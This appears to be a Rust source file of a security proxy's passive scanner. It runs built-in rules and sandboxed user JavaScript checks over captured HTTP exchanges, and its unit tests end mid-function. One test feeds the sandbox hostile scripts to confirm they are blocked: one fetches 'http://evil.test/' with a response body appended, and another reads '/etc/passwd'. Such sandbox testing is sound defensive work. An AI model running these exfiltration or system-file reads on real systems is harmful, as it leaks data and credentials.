//! Passive scanner: runs every enabled rule over captured exchanges. Scanning is
//! incremental: a watermark records the last history row scanned, so callers
//! (proxy, send, findings queries) can cheaply "catch up" at any time.
//!
//! After the built-in rules and the declarative passive checks come the project's script
//! checks ([`ScriptCheck`]): hook scripts whose `check(exchange)` returns findings, run in the
//! sandbox of [`crate::hooks`]. They are given a recorded exchange and send nothing.

pub mod rules;
pub mod util;

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Mutex, OnceLock};

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::error::Result;
use crate::hooks::{with_bytes, Hook, HookKind, ScriptFinding, ScriptRef};
use crate::scan::{AlertDef, Finding, Message, PassiveRule};
use crate::store::Store;

pub const SETTINGS_KEY: &str = "passive";
const WATERMARK_KEY: &str = "passive.last_id";
const BATCH: usize = 200;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct PassiveSettings {
    /// Rule ids (ZAP plugin ids) that are switched off.
    #[serde(default)]
    pub disabled: Vec<u32>,
    /// Passive checks (feed or local, by check id) that are switched off.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub disabled_checks: Vec<String>,
    /// History sources that get scanned.
    #[serde(default = "default_sources")]
    pub sources: Vec<String>,
    /// Passive checks a person wrote as scripts (`scan script add`). One is switched off like a
    /// declarative check, by its id (`script:NAME`) in `disabled_checks`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub scripts: Vec<ScriptCheck>,
}

/// A passive check written as a script: a file defining `check(exchange)`, pinned by the hash
/// of its text when it was added.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct ScriptCheck {
    pub name: String,
    pub file: PathBuf,
    pub sha256: String,
    /// Who added it: gui or cli (a script isn't added through MCP).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub origin: Option<String>,
}

/// What a script check's id and its findings' alert refs start with.
pub const SCRIPT_PREFIX: &str = "script:";

impl ScriptCheck {
    /// Its id among the passive checks, for `scan enable` and `scan disable`: `script:NAME`.
    pub fn id(&self) -> String {
        format!("{SCRIPT_PREFIX}{}", self.name)
    }

    pub fn script(&self) -> ScriptRef {
        ScriptRef { file: self.file.clone(), sha256: self.sha256.clone() }
    }

    /// Whether `name` can name a script check: it is part of its findings' alert refs.
    pub fn valid_name(name: &str) -> bool {
        !name.is_empty()
            && name.len() <= 40
            && name.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.'))
    }

    /// The script check that raised a finding with this alert ref (`script:NAME:KIND`), by name.
    pub fn name_in(alert_ref: &str) -> Option<&str> {
        alert_ref.strip_prefix(SCRIPT_PREFIX).map(|rest| rest.split(':').next().unwrap_or(rest))
    }
}

fn default_sources() -> Vec<String> {
    ["proxy", "send", "crawl", "crawl-browser"].map(String::from).to_vec()
}

impl Default for PassiveSettings {
    fn default() -> Self {
        Self { disabled: Vec::new(), disabled_checks: Vec::new(), sources: default_sources(), scripts: Vec::new() }
    }
}

/// The history source of a retest's request (`findings retest`).
pub const RETEST_SOURCE: &str = "retest";

impl PassiveSettings {
    /// The sources a background scan reads: `sources` less retest traffic, whatever the list
    /// says. A retest reads its own reply and counts it as a sighting, so a scan reading it too
    /// would count one retest twice (and could reopen a finding the retest left as it was). A
    /// list saved before `scan sources` refused `retest` may still name it.
    fn scanned_sources(&self) -> Vec<String> {
        self.sources.iter().filter(|s| *s != RETEST_SOURCE).cloned().collect()
    }
}

pub fn all_rules() -> &'static [Box<dyn PassiveRule>] {
    static RULES: OnceLock<Vec<Box<dyn PassiveRule>>> = OnceLock::new();
    RULES.get_or_init(rules::all)
}

static CHECK_HOME: OnceLock<PathBuf> = OnceLock::new();

/// Also run the passive checks (`scope: passive`) of the brainproxy feed and the
/// local checks under `home`. Call once at startup; without it only the built-in
/// rules run.
pub fn use_checks_from(home: &Path) {
    let _ = CHECK_HOME.set(home.to_path_buf());
}

/// The passive checks, loaded on first use (templates that don't load are left out,
/// as `checks list` reports them).
pub fn checks() -> &'static [crate::checks::PassiveCheck] {
    static CHECKS: OnceLock<Vec<crate::checks::PassiveCheck>> = OnceLock::new();
    CHECKS.get_or_init(|| {
        let Some(home) = CHECK_HOME.get() else { return Vec::new() };
        let dirs: Vec<PathBuf> = [crate::checks::brainproxy_dir(home), crate::checks::local_dir(home)]
            .into_iter()
            .filter(|d| d.is_dir())
            .collect();
        match crate::checks::load(&dirs, &Default::default()) {
            Ok(loaded) => crate::checks::into_passive(loaded.checks),
            Err(_) => Vec::new(),
        }
    })
}

/// A script check that failed on an exchange, or couldn't be loaded: what it would have found
/// there isn't known.
#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct ScriptError {
    pub script: String,
    pub error: String,
    /// The first history row it failed on (0: it couldn't be loaded at all).
    pub history_id: i64,
    /// How many exchanges it failed on this way.
    pub count: usize,
}

/// The enabled script checks of a project, ready to run.
pub struct ScriptChecks {
    checks: Vec<(String, Hook)>,
    /// The failures to show: the first few different ones.
    errors: Mutex<Vec<ScriptError>>,
    /// Every script that failed somewhere or didn't run, however many failures are shown: what
    /// a rescan keeps and a retest refuses to decide goes by this.
    failed: Mutex<std::collections::BTreeSet<String>>,
}

fn enabled_scripts(settings: &PassiveSettings) -> impl Iterator<Item = &ScriptCheck> {
    settings.scripts.iter().filter(|c| !settings.disabled_checks.contains(&c.id()))
}

/// The enabled script checks that won't run now (their file is gone or changed), with why.
pub fn script_problems(settings: &PassiveSettings) -> Vec<(String, String)> {
    enabled_scripts(settings).filter_map(|c| Some((c.name.clone(), c.script().read().err()?))).collect()
}

/// The most a response or request body a script check is handed: more is cut, and said.
const SCRIPT_BODY: usize = 2 << 20;
/// Different failures kept for a scan's result.
const SCRIPT_ERRORS: usize = 20;

impl ScriptChecks {
    /// The script checks `settings` has switched on. One whose file is gone or changed since it
    /// was added doesn't run, which is an error of the scan's.
    pub fn load(settings: &PassiveSettings) -> Self {
        let loaded = ScriptChecks { checks: Vec::new(), errors: Mutex::default(), failed: Mutex::default() };
        let mut checks = Vec::new();
        for check in enabled_scripts(settings) {
            match Hook::load(HookKind::Check, &check.script()) {
                Ok(hook) => checks.push((check.name.clone(), hook)),
                Err(e) => loaded.note(&check.name, None, 0, &e),
            }
        }
        // A scan follows a scan (the proxy's, every few rows): the scripts of the last one stay
        // held between them, so each doesn't start its processes again, nor forget that a
        // script was stopped. Scripts no longer in the settings are let go here.
        static HELD: Mutex<Vec<Hook>> = Mutex::new(Vec::new());
        *HELD.lock().unwrap_or_else(|e| e.into_inner()) = checks.iter().map(|(_, hook)| hook.clone()).collect();
        ScriptChecks { checks, ..loaded }
    }

    /// Keeps a failure for the scan's result, and says it on stderr the first time.
    fn note(&self, script: &str, hook: Option<&Hook>, history_id: i64, error: &str) {
        match hook {
            Some(hook) => hook.warn(&format!("passive check {SCRIPT_PREFIX}{script} found nothing"), error),
            None => eprintln!("brainproxy: passive check {SCRIPT_PREFIX}{script} not run: {error}"),
        }
        self.failed.lock().unwrap_or_else(|e| e.into_inner()).insert(script.to_string());
        let mut errors = self.errors.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(known) = errors.iter_mut().find(|e| e.script == script && e.error == error) {
            known.count += 1;
        } else if errors.len() < SCRIPT_ERRORS {
            errors.push(ScriptError { script: script.to_string(), error: error.to_string(), history_id, count: 1 });
        }
    }

    /// The failures so far, for showing: at most a few different ones.
    pub fn errors(&self) -> Vec<ScriptError> {
        self.errors.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Every script that failed on an exchange so far, or didn't run.
    pub fn failed(&self) -> Vec<String> {
        self.failed.lock().unwrap_or_else(|e| e.into_inner()).iter().cloned().collect()
    }

    /// Runs each script's `check` over `msg`. A script that fails on it finds nothing there.
    fn scan(&self, msg: &Message, out: &mut Vec<Finding>) {
        if self.checks.is_empty() {
            return;
        }
        let exchange = exchange_view(msg);
        for (name, hook) in &self.checks {
            let found = match hook.check(&exchange) {
                Ok(found) => found,
                Err(e) => {
                    self.note(name, Some(hook), msg.history_id, e.text());
                    continue;
                }
            };
            for f in found {
                match script_alert(name, &f) {
                    Ok(def) => out
                        .push(def.raise(f.param, f.evidence).risk(f.risk).confidence(f.confidence).other_info(f.info)),
                    Err(e) => self.note(name, Some(hook), msg.history_id, &e),
                }
            }
        }
    }
}

/// A body as a script check reads it: text (and base64 when it isn't UTF-8), cut at
/// [`SCRIPT_BODY`].
fn body_view(part: Value, body: &[u8]) -> Value {
    let mut cut = &body[..body.len().min(SCRIPT_BODY)];
    // Text cut inside a character is still text: the cut goes back to the character's start.
    if let Err(e) = std::str::from_utf8(cut) {
        if cut.len() < body.len() && e.error_len().is_none() {
            cut = &cut[..e.valid_up_to()];
        }
    }
    let mut part = with_bytes(part, "body", "bodyBase64", cut);
    part["bodyTruncated"] = json!(cut.len() < body.len());
    part
}

/// A recorded exchange as a script check's `check` gets it.
fn exchange_view(msg: &Message) -> Value {
    json!({
        "id": msg.history_id,
        "method": msg.method,
        "url": msg.url,
        "scheme": msg.scheme,
        "host": msg.host,
        "port": msg.port,
        "path": msg.path,
        "query": msg.query,
        "status": msg.status,
        "request": body_view(json!({ "headers": msg.req_headers }), &msg.req_body),
        "response": body_view(json!({ "headers": msg.resp_headers }), &msg.resp_body),
    })
}

/// The alert type of a script's finding: `script:NAME:KIND`, where the kind is the finding's
/// `id` or made of its name. Kept for the process's life, like a declarative check's, so a
/// script may raise only so many kinds; the first finding of a kind gives its texts.
fn script_alert(script: &str, f: &ScriptFinding) -> std::result::Result<&'static AlertDef, String> {
    static DEFS: OnceLock<Mutex<HashMap<String, &'static AlertDef>>> = OnceLock::new();
    let mut defs = DEFS.get_or_init(Default::default).lock().unwrap_or_else(|e| e.into_inner());
    let prefix = format!("{SCRIPT_PREFIX}{script}:");
    let alert_ref = format!("{prefix}{}", if f.id.is_empty() { "finding" } else { &f.id });
    if let Some(def) = defs.get(&alert_ref) {
        return Ok(def);
    }
    let max = crate::hooks::max_alert_types();
    if defs.keys().filter(|k| k.starts_with(&prefix)).count() >= max {
        return Err(format!("it raises more than {max} kinds of finding; give findings of one kind the same id"));
    }
    let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
    // Marked as a user's own, wherever the finding is read.
    let source = format!("Raised by the passive check script {script:?}, which a user of this project wrote: not one of brainproxy's own rules.");
    let description = match f.description.trim() {
        "" => source,
        text => format!("{text}\n\n{source}"),
    };
    let def: &'static AlertDef = Box::leak(Box::new(AlertDef {
        alert_ref: leak(alert_ref.clone()),
        name: leak(f.name.clone()),
        risk: f.risk,
        confidence: f.confidence,
        cwe: f.cwe,
        wasc: 0,
        description: leak(description),
        solution: leak(f.solution.clone()),
        references: &[],
        tags: &["user-script"],
    }));
    defs.insert(alert_ref, def);
    Ok(def)
}

/// Runs enabled rules, then the enabled passive checks and script checks, over one message.
pub fn scan_message(msg: &Message, settings: &PassiveSettings) -> Vec<Finding> {
    scan_message_with(msg, settings, &ScriptChecks::load(settings))
}

/// [`scan_message`], with the project's script checks already loaded: a scan of many messages
/// loads them once, and reads their failures from `scripts` when it is done.
pub fn scan_message_with(msg: &Message, settings: &PassiveSettings, scripts: &ScriptChecks) -> Vec<Finding> {
    let mut out = builtin_findings(msg, settings);
    if msg.status != 0 {
        scripts.scan(msg, &mut out);
    }
    out
}

/// What the built-in rules and the declarative passive checks find in one message.
fn builtin_findings(msg: &Message, settings: &PassiveSettings) -> Vec<Finding> {
    let mut out = Vec::new();
    for rule in all_rules() {
        if !settings.disabled.contains(&rule.id()) {
            // A rule that panics on one response loses its findings there, but doesn't stop
            // the scan: the watermark would never pass that row and every scan would fail.
            let mut found = Vec::new();
            if std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| rule.scan(msg, &mut found))).is_ok() {
                out.append(&mut found);
            }
        }
    }
    let checks: Vec<_> = checks().iter().filter(|c| !settings.disabled_checks.iter().any(|d| d == c.id())).collect();
    if !checks.is_empty() && msg.status != 0 {
        let resp = crate::scan::active::Response::recorded(msg.status, msg.resp_headers.clone(), msg.resp_body.clone());
        let query = msg.query.as_deref().map(|q| format!("?{q}")).unwrap_or_default();
        let mut request = format!("{} {}{query} HTTP/1.1\r\n", msg.method, msg.path);
        for (k, v) in &msg.req_headers {
            request.push_str(&format!("{k}: {v}\r\n"));
        }
        for c in checks {
            c.scan(&msg.host, &request, &resp, &mut out);
        }
    }
    out
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct ScanStats {
    pub scanned: usize,
    pub new_findings: usize,
    pub last_id: i64,
    /// Rescan: findings it didn't find again and removed (none of them triaged).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub removed: Option<usize>,
    /// Rescan: triaged findings it didn't find again, kept with 0 hits.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub kept_not_found: Option<usize>,
    /// Script checks that failed on an exchange or couldn't be loaded: what they would have
    /// found there isn't in the findings.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub script_errors: Vec<ScriptError>,
    /// Every script check that failed somewhere or didn't run (`script_errors` lists only the
    /// first few different failures).
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub failed_scripts: Vec<String>,
}

/// History rows completed after the scanner passed them and not scanned again yet (a JSON
/// list of ids): see [`scan_later`].
const LATE_KEY: &str = "passive.late";

/// Leaves rows `ids` for the next [`scan_pending`] to scan again, whether or not it has passed
/// them: rows completed (an event stream's, which got its body) by a process that has no time
/// to scan them itself, such as a proxy that is stopping.
pub fn scan_later(store: &Store, ids: &[i64]) -> Result<()> {
    if ids.is_empty() {
        return Ok(());
    }
    let mut late: Vec<i64> = store.meta_get(LATE_KEY)?.and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
    for id in ids {
        if !late.contains(id) {
            late.push(*id);
        }
    }
    store.meta_set(LATE_KEY, Some(&serde_json::to_string(&late).unwrap_or_default()))
}

/// Scans every capture recorded since the last call, and the rows left by [`scan_later`].
pub fn scan_pending(store: &mut Store) -> Result<ScanStats> {
    let settings: PassiveSettings = store.setting(SETTINGS_KEY)?;
    let mut last: i64 = store.meta_get(WATERMARK_KEY)?.and_then(|v| v.parse().ok()).unwrap_or(0);
    let mut stats = ScanStats { last_id: last, ..Default::default() };
    let late: Vec<i64> = store.meta_get(LATE_KEY)?.and_then(|v| serde_json::from_str(&v).ok()).unwrap_or_default();
    if !late.is_empty() {
        // Taken off the list first: a row that fails to scan mustn't fail every scan after.
        store.meta_set(LATE_KEY, None)?;
        // One the scanner hasn't reached yet is scanned below, whole.
        for id in late.into_iter().filter(|id| *id <= last) {
            stats.new_findings += scan_late(store, id)?;
            stats.scanned += 1;
        }
    }
    let sources = settings.scanned_sources();
    // Rows recorded while we scan are left for the next call.
    let max_at_start = store.max_history_id()?;
    if max_at_start <= last {
        return Ok(stats);
    }
    let scripts = ScriptChecks::load(&settings);
    loop {
        let batch = store.scan_messages_after(last, &sources, BATCH)?;
        // Rows from unscanned sources are skipped by the query; jump the watermark past them.
        let Some(batch_last) = batch.last().map(|m| m.history_id) else { break };
        for msg in &batch {
            let findings = scan_message_with(msg, &settings, &scripts);
            stats.new_findings += store.record_findings("passive", msg, &findings)?;
            stats.scanned += 1;
        }
        last = batch_last;
        if batch.len() < BATCH {
            break;
        }
    }
    last = last.max(max_at_start);
    store.meta_set(WATERMARK_KEY, Some(&last.to_string()))?;
    stats.last_id = last;
    stats.script_errors = scripts.errors();
    stats.failed_scripts = scripts.failed();
    Ok(stats)
}

/// Scans history row `id` if [`scan_pending`] has already moved past it: a request recorded
/// before it went out had no response then, so it was skipped. Call it before
/// `scan_pending` once the row is complete; returns the new findings.
pub fn scan_late(store: &mut Store, id: i64) -> Result<usize> {
    let last: i64 = store.meta_get(WATERMARK_KEY)?.and_then(|v| v.parse().ok()).unwrap_or(0);
    if id > last {
        return Ok(0);
    }
    let settings: PassiveSettings = store.setting(SETTINGS_KEY)?;
    let mut new = 0;
    for msg in store.scan_messages_after(id - 1, &settings.scanned_sources(), 1)?.iter().filter(|m| m.history_id == id)
    {
        new += store.record_findings("passive", msg, &scan_message(msg, &settings))?;
    }
    Ok(new)
}

/// Rescans all history from the start and counts every passive finding again. Findings found
/// again keep their id, state, note and origins; ones not found again are removed unless
/// someone triaged them, which are kept with 0 hits.
pub fn rescan(store: &mut Store) -> Result<ScanStats> {
    // A script check that won't run, or that fails on the way, can't find its findings again:
    // they stay as they are, where a rule's that finds nothing any more go.
    let settings: PassiveSettings = store.setting(SETTINGS_KEY)?;
    let kept = |names: Vec<String>| -> Vec<String> {
        names.into_iter().map(|name| format!("{SCRIPT_PREFIX}{name}:")).collect()
    };
    let unloaded = kept(script_problems(&settings).into_iter().map(|(name, _)| name).collect());
    let before = store.findings_rescan_start("passive", &unloaded)?;
    store.meta_set(WATERMARK_KEY, None)?;
    let mut stats = scan_pending(store)?;
    let failed = kept(stats.failed_scripts.clone());
    let (removed, kept) = store.findings_rescan_finish("passive", &failed)?;
    stats.new_findings = store.findings_count_after("passive", before)?;
    stats.removed = Some(removed);
    stats.kept_not_found = Some(kept);
    Ok(stats)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::capture::Capture;
    use crate::http::Target;
    use crate::scan::findings_db::FindingFilter;
    use crate::scan::{Confidence, Risk};

    /// Settings with only script checks on: `scripts` by name, each in a file of its own.
    fn only_scripts(scripts: &[(&str, &str)]) -> (PassiveSettings, Vec<PathBuf>) {
        crate::sandbox::tests::use_test_runner();
        let mut dirs = Vec::new();
        let scripts = scripts
            .iter()
            .map(|(name, text)| {
                let (script, dir) = crate::hooks::tests::script_file(text);
                dirs.push(dir);
                ScriptCheck { name: name.to_string(), file: script.file, sha256: script.sha256, origin: None }
            })
            .collect();
        let disabled = all_rules().iter().map(|r| r.id()).collect();
        (PassiveSettings { disabled, scripts, ..Default::default() }, dirs)
    }

    fn message(id: i64, path: &str, response: &str) -> Message {
        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
        let request = format!("POST {path} HTTP/1.1\r\nHost: h.test\r\nCookie: s=1\r\n\r\nq=1");
        Message::from_exchange(id, &target, request.as_bytes(), response.as_bytes())
    }

    const RESPONSE: &str = "HTTP/1.1 200 OK\r\nX-Debug: on\r\nContent-Length: 12\r\n\r\ntoken=abc123";

    fn clean(dirs: Vec<PathBuf>) {
        for dir in dirs {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_script_check_reads_an_exchange_and_its_findings_are_marked_as_a_scripts() {
        let (settings, dirs) = only_scripts(&[(
            "debug",
            "function check(x) {
                const header = x.response.headers.find(([name]) => name.toLowerCase() === 'x-debug');
                const seen = [x.id, x.method, x.scheme, x.host, x.port, x.path, x.query, x.status, x.url,
                              x.request.headers.length, x.request.body, x.response.bodyTruncated].join(' ');
                const found = [{ name: 'Debug header', risk: 'medium', confidence: 'high', param: header[0],
                                 evidence: header[1], info: seen, description: 'Debugging is on.', solution: 'Turn it off.',
                                 cwe: 489, id: 'debug-on' }];
                const token = /token=(\\w+)/.exec(x.response.body);
                if (token) found.push({ name: 'Token in a body', evidence: token[1] });
                return found;
            }",
        )]);
        let found = scan_message(&message(7, "/a?b=1", RESPONSE), &settings);
        assert_eq!(found.len(), 2, "{found:?}");
        let (debug, token) = (&found[0], &found[1]);
        assert_eq!(debug.def.alert_ref, "script:debug:debug-on");
        assert_eq!(
            (debug.def.name, debug.risk, debug.confidence, debug.def.cwe),
            ("Debug header", Risk::Medium, Confidence::High, 489)
        );
        assert_eq!((debug.param.as_str(), debug.evidence.as_str()), ("X-Debug", "on"));
        assert_eq!(debug.other_info, "7 POST https h.test 443 /a b=1 200 https://h.test/a?b=1 2 q=1 false");
        assert!(debug.def.description.starts_with("Debugging is on.\n\nRaised by the passive check script \"debug\""));
        assert_eq!((debug.def.solution, debug.def.tags), ("Turn it off.", &["user-script"][..]));
        // A finding with no id is told apart by its name; what it leaves out has a default.
        assert_eq!(token.def.alert_ref, "script:debug:token-in-a-body");
        assert_eq!((token.risk, token.confidence, token.evidence.as_str()), (Risk::Info, Confidence::Medium, "abc123"));
        assert!(token.def.description.starts_with("Raised by the passive check script"));
        assert_eq!(ScriptCheck::name_in(token.def.alert_ref), Some("debug"));
        // Switched off like any check, by its id.
        let off = PassiveSettings { disabled_checks: vec!["script:debug".into()], ..settings.clone() };
        assert!(scan_message(&message(8, "/a", RESPONSE), &off).is_empty());
        // And an exchange with no response isn't handed to it.
        let mut unanswered = message(9, "/a", RESPONSE);
        unanswered.status = 0;
        assert!(scan_message(&unanswered, &settings).is_empty());
        clean(dirs);
    }

    #[test]
    fn a_script_check_that_fails_finds_nothing_and_the_scan_says_so() {
        let (settings, dirs) = only_scripts(&[
            ("throws", "function check(x) { if (x.path !== '/fine') throw new Error('no ' + x.path); }"),
            ("garbage", "function check(x) { return x.path === '/fine' ? null : [{ name: 'A' }, 'B']; }"),
            ("unnamed", "function check(x) { return x.path === '/fine' ? [] : { evidence: 'x' }; }"),
            ("network", "function check(x) { return x.path === '/fine' ? undefined : fetch('http://evil.test/' + x.response.body); }"),
            ("files", "function check(x) { if (x.path !== '/fine') return { name: require('fs').readFileSync('/etc/passwd', 'utf8') }; }"),
            ("fine", "function check(x) { return { name: 'Seen', evidence: x.path }; }"),
        ]);
        let scripts = ScriptChecks::load(&settings);
        for (id, path) in [(1, "/a"), (2, "/b"), (3, "/fine")] {
            let found = scan_message_with(&message(id, path, RESPONSE), &settings, &scripts);
            // The one that works is not held up by the others.
            assert_eq!(found.len(), 1, "{path}: {found:?}");
            assert_eq!((found[0].def.alert_ref, found[0].evidence.as_str()), ("script:fine:seen", path));
        }
        let errors = scripts.errors();
        let of = |name: &str| errors.iter().filter(|e| e.script == name).collect::<Vec<_>>();
        // The same failure is counted, not listed again; a different one is listed.
        let throws = of("throws");
        assert_eq!(throws.len(), 2);
        assert_eq!((throws[0].error.as_str(), throws[0].history_id, throws[0].count), ("Error: no /a", 1, 1));
        for (name, why) in [
            ("garbage", "a string as a finding"),
            ("unnamed", "needs a name"),
            ("network", "fetch is not defined"),
            ("files", "isn't available here"),
        ] {
            let e = of(name);
            assert!(
                e.len() == 1 && e[0].count == 2 && e[0].history_id == 1 && e[0].error.contains(why),
                "{name}: {e:?}"
            );
        }
        assert!(of("fine").is_empty());
        clean(dirs);
    }

    #[test]
    fn a_script_check_that_never_returns_is_stopped_and_checks_nothing_more() {
        let (settings, dirs) = only_scripts(&[(
            "slow",
            "function check(x) { if (x.path === '/slow') /^(a+)+$/.test('a'.repeat(40) + 'b'); return { name: 'Seen', evidence: x.path }; }",
        )]);
        let scripts = ScriptChecks::load(&settings);
        assert_eq!(scan_message_with(&message(1, "/a", RESPONSE), &settings, &scripts).len(), 1);
        let started = std::time::Instant::now();
        assert!(scan_message_with(&message(2, "/slow", RESPONSE), &settings, &scripts).is_empty());
        assert!(started.elapsed() < crate::sandbox::CALL_LIMIT + std::time::Duration::from_secs(3));
        let started = std::time::Instant::now();
        assert!(scan_message_with(&message(3, "/a", RESPONSE), &settings, &scripts).is_empty());
        assert!(started.elapsed() < std::time::Duration::from_millis(500));
        let errors = scripts.errors();
        assert!(errors[0].error.contains("time limit") && errors[0].history_id == 2, "{errors:?}");
        assert!(errors[1].error.contains("stopped earlier") && errors[1].history_id == 3, "{errors:?}");
        clean(dirs);
    }

    #[test]
    fn a_long_body_is_cut_for_a_script_and_bytes_come_as_base64() {
        let (settings, dirs) = only_scripts(&[(
            "body",
            "function check(x) {
                const r = x.response;
                return { name: 'Body', evidence: [r.body.length, r.bodyTruncated, typeof r.bodyBase64, x.request.bodyTruncated].join(' ') };
            }",
        )]);
        let mut msg = message(1, "/a", RESPONSE);
        msg.resp_body = vec![b'a'; SCRIPT_BODY + 10];
        assert_eq!(scan_message(&msg, &settings)[0].evidence, format!("{SCRIPT_BODY} true undefined false"));
        msg.resp_body = vec![0xff, 0xfe, 0x00];
        assert_eq!(scan_message(&msg, &settings)[0].evidence, "3 false string false");
        // Text cut inside a character is still text, a little shorter.
        msg.resp_body = "é".repeat(SCRIPT_BODY / 2 + 8).into_bytes();
        msg.resp_body.insert(0, b'a');
        assert_eq!(scan_message(&msg, &settings)[0].evidence, format!("{} true undefined false", SCRIPT_BODY / 2));
        clean(dirs);
    }

    #[test]
    fn a_scan_records_a_scripts_findings_and_a_rescan_keeps_them_when_the_script_cant_run() {
        let (settings, dirs) = only_scripts(&[(
            "debug",
            "function check(x) {
                if (x.path === '/boom') throw new Error('boom');
                if (x.response.headers.some(([name]) => name === 'X-Debug')) return { name: 'Debug header', risk: 'low', param: 'X-Debug' };
            }",
        )]);
        let mut s = Store::open_in_memory().unwrap();
        s.set_setting(SETTINGS_KEY, &settings).unwrap();
        let target = Target { scheme: "http".into(), host: "h.test".into(), port: 80 };
        let record = |s: &mut Store, path: &str| {
            let request = format!("GET {path} HTTP/1.1\r\nHost: h.test\r\n\r\n");
            s.record(&Capture::new("send", &target, request.as_bytes(), Some(RESPONSE.as_bytes()), None, None))
                .unwrap();
        };
        record(&mut s, "/a");
        record(&mut s, "/b");
        let stats = scan_pending(&mut s).unwrap();
        assert_eq!((stats.scanned, stats.new_findings, stats.script_errors.len()), (2, 2, 0));
        let findings = |s: &Store| s.findings_list(&FindingFilter::default(), 10).unwrap();
        let found = findings(&s);
        assert_eq!(found.len(), 2);
        assert_eq!(
            (found[0]["source"].as_str(), found[0]["alert_ref"].as_str()),
            (Some("passive"), Some("script:debug:debug-header"))
        );
        assert_eq!(found[0]["risk"], "low");
        // An exchange it fails on is passed, with the failure in the scan's result.
        record(&mut s, "/boom");
        let stats = scan_pending(&mut s).unwrap();
        assert_eq!((stats.scanned, stats.new_findings), (1, 0));
        assert_eq!(
            (stats.script_errors[0].script.as_str(), stats.script_errors[0].error.as_str()),
            ("debug", "Error: boom")
        );
        // A rescan in which it failed somewhere keeps what it found before.
        let stats = rescan(&mut s).unwrap();
        assert_eq!((stats.removed, stats.script_errors.len(), findings(&s).len()), (Some(0), 1, 2));
        // Its file changes: it doesn't run, the scan says so, and a rescan keeps its findings.
        std::fs::write(&settings.scripts[0].file, "function check() {}").unwrap();
        assert_eq!(script_problems(&settings).len(), 1);
        let stats = rescan(&mut s).unwrap();
        assert_eq!((stats.scanned, stats.removed), (3, Some(0)));
        assert!(
            stats.script_errors[0].error.contains("changed since it was named")
                && stats.script_errors[0].history_id == 0
        );
        assert_eq!(findings(&s).len(), 2);
        // Switched off, it is like any rule switched off: a rescan finds nothing of its again.
        let off = PassiveSettings { disabled_checks: vec!["script:debug".into()], ..settings.clone() };
        s.set_setting(SETTINGS_KEY, &off).unwrap();
        let stats = rescan(&mut s).unwrap();
        assert_eq!((stats.removed, stats.script_errors.len(), findings(&s).len()), (Some(2), 0, 0));
        clean(dirs);
    }

    #[test]
    fn a_script_may_raise_only_so_many_kinds_of_finding() {
        let (settings, dirs) = only_scripts(&[(
            "many",
            "function check(x) { return Array.from({ length: 40 }, (_, i) => ({ name: 'Kind ' + x.path + i })); }",
        )]);
        let scripts = ScriptChecks::load(&settings);
        assert_eq!(scan_message_with(&message(1, "/a", RESPONSE), &settings, &scripts).len(), 40);
        let found = scan_message_with(&message(2, "/b", RESPONSE), &settings, &scripts);
        assert_eq!(found.len(), crate::hooks::max_alert_types() - 40);
        assert!(scripts.errors()[0].error.contains("more than 64 kinds of finding"));
        // The kinds it has already raised are still raised.
        assert_eq!(scan_message_with(&message(3, "/a", RESPONSE), &settings, &scripts).len(), 40);
        clean(dirs);
    }

    #[test]
    fn a_script_check_is_stored_with_its_pin_and_named_plainly() {
        let check = ScriptCheck {
            name: "a.b-c_1".into(),
            file: "/x/c.js".into(),
            sha256: "0".repeat(64),
            origin: Some("cli".into()),
        };
        let settings = PassiveSettings { scripts: vec![check.clone()], ..Default::default() };
        let stored = serde_json::to_value(&settings).unwrap();
        assert_eq!(
            stored["scripts"][0],
            json!({"name": "a.b-c_1", "file": "/x/c.js", "sha256": "0".repeat(64), "origin": "cli"})
        );
        assert_eq!(serde_json::from_value::<PassiveSettings>(stored).unwrap(), settings);
        // Settings with no script checks are stored as they always were.
        assert!(serde_json::to_value(PassiveSettings::default()).unwrap().get("scripts").is_none());
        assert_eq!(check.id(), "script:a.b-c_1");
        assert!(ScriptCheck::valid_name("a.b-c_1") && !ScriptCheck::valid_name("a:b") && !ScriptCheck::valid_name(""));
        assert!(!ScriptCheck::valid_name(&"a".repeat(41)) && !ScriptCheck::valid_name("a b"));
        assert_eq!(ScriptCheck::name_in("script:a.b-c_1:kind-1"), Some("a.b-c_1"));
        assert_eq!(ScriptCheck::name_in("check:cve-1"), None);
    }

    #[test]
    fn a_rescan_keeps_the_findings_of_every_script_that_failed_however_many_did() {
        // More scripts that don't run than failures are listed, then one that fails on the way.
        let mut names: Vec<String> = (0..SCRIPT_ERRORS + 2).map(|i| format!("gone{i:02}")).collect();
        names.push("zz-throws".into());
        let text = "function check(x) { if (x.path === '/boom') throw new Error('boom'); return { name: 'Seen' }; }";
        let scripts: Vec<(&str, &str)> = names.iter().map(|n| (n.as_str(), text)).collect();
        let (mut settings, dirs) = only_scripts(&scripts);
        let mut s = Store::open_in_memory().unwrap();
        let target = Target { scheme: "http".into(), host: "h.test".into(), port: 80 };
        let record = |s: &mut Store, path: &str| {
            let request = format!("GET {path} HTTP/1.1\r\nHost: h.test\r\n\r\n");
            s.record(&Capture::new("send", &target, request.as_bytes(), Some(RESPONSE.as_bytes()), None, None))
                .unwrap();
        };
        record(&mut s, "/a");
        s.set_setting(SETTINGS_KEY, &settings).unwrap();
        assert_eq!(scan_pending(&mut s).unwrap().new_findings, names.len());
        // All but the last lose their files; the last throws on a new exchange.
